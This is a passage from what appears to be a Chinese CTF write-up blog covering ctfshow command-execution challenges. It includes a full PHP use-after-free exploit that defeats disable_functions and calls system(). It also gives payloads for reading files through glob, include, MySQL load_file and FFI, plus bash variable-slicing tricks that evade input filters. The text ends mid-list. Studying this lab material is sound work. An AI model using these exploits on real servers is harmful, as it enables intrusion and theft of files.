class="line">c=function%20ctfshow(%24cmd)%0A%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%0A%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for%20(%24j%20%3D%20%24s%20-%201%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%20%2B%20%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C%20(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C%20(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if%20(%24s%20!%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if%20(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if%20(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while%20(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%0A%20%20%20%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20if%20(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if%20(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3B%0Aob_end_flush()%3B</span><br></pre></td></tr></table></figure><h2 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h2><p>先扫一下根目录 看下flag在哪里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;---&quot;</span>;&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>flag在flagc.txt下</p><p>include没有过滤可以直接用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>这道题还有一个思路</p><p>就是利用上面的uaf脚本 但是里面有个函数被禁用了</p><p>可以根据函数的作用利用其他函数实现这个函数的功能从而绕过 详情见b站ctfshow账号</p><h2 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h2><p>扫描根目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这次flag在flagx.txt下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagx.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h2 id="Web75"><a href="#Web75" class="headerlink" title="Web75"></a>Web75</h2><p>用上面的glob协议扫描flag在flag36.txt</p><p>这道题的payload不是很懂</p><p>利用sql语句绕过open_basedir和disable_function</p><p>mysql的连接参数可以通过前面几个题拿到 但我太菜不知道在哪里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h2 id="Web76"><a href="#Web76" class="headerlink" title="Web76"></a>Web76</h2><p>老样子glob协议扫描</p><p>flag在flag36d.txt</p><p>还是sql语句绕</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="operator">=</span>try &#123;$dbh <span class="operator">=</span> <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);foreach($dbh<span class="operator">-</span><span class="operator">&gt;</span>query(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> $<span class="type">row</span>)</span><br><span class="line">&#123;echo($<span class="type">row</span>[<span class="number">0</span>]).&quot;|&quot;; &#125;$dbh <span class="operator">=</span> <span class="keyword">null</span>;&#125;catch (PDOException $e) &#123;echo $e<span class="operator">-</span></span><br><span class="line"><span class="operator">&gt;</span>getMessage();exit(<span class="number">0</span>);&#125;exit(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h2><p>扫描根目录 这次有两个flag 文件一个flag36x.txt 一个readflag</p><p>flag在readflag下</p><p>这道题利用php7.4新特性FFI进行绕过</p><p><a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a> </p><p><a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; 1.txt&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>执行完成后访问1.txt拿到flag</p><h2 id="Web118"><a href="#Web118" class="headerlink" title="Web118"></a>Web118</h2><p>这里给了一个提示 链接已经挂了</p><p>是一个图片</p><p><img src="/posts/999021e8/image-20220331104415460.png" alt="image-20220331104415460"></p><p>打开题目是一个输入框 查看源代码发现这个搜索框是执行<code>system($code);</code>code是我们传入的变量</p><p>这道题利用了linux的内置变量</p><p><a href="https://www.cnblogs.com/sparkdev/p/9934595.html">https://www.cnblogs.com/sparkdev/p/9934595.html</a></p><p><a href="https://blog.51cto.com/allenh/1695810">https://blog.51cto.com/allenh/1695810</a></p><blockquote><p>${PWD} 返回工作目录(你当前所在的目录)</p><p>可以使用切片取得返回的字母  例:${PWD:0:1}</p><p>同时可以利用取反号<del>取变量的后几位  例:${PWD:</del>0}</p><p>0也可以用字母代替 例:<code>$&#123;PWD:~A&#125;</code> 返回结果和 <code>$&#123;PWD:~0&#125;</code>相同</p><p>${PATH} 通常是bin</p><p>$IFS 内部域分隔符 默认为空白(空格, 制表符,和换行符)</p></blockquote><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;PATH:~A&#125;<span class="variable">$&#123;PWD:~A&#125;</span><span class="variable">$IFS</span>????.???  <span class="comment">#nl flag.php</span></span></span><br></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web119-121"><a href="#Web119-121" class="headerlink" title="Web119-121"></a>Web119-121</h2><p>因为payload有{和#会导致博客BUG因此移至语雀<a href="https://www.yuque.com/fatty-dooyc/ihgw31/zuxzgr">CTFShow Web入门_命令执行 · 语雀 (yuque.com)</a></p><h2 id="Web122"><a href="#Web122" class="headerlink" title="Web122"></a>Web122</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>过滤了PWD和#</p><blockquote><p>yu师傅说${}的报错在本地返回时1，但是题目的报错环境是2，所以放开了&lt;<br>&lt;A的报错返回也是1，所以就成功得到了数字1，至于数字4拿RANDOM随机就可以了。</p><p>由于需要$?返回值为1，所以在前面加一个&lt;A使其报错；</p></blockquote><p>$?非0的时候的返回值是可控的 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input/output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too 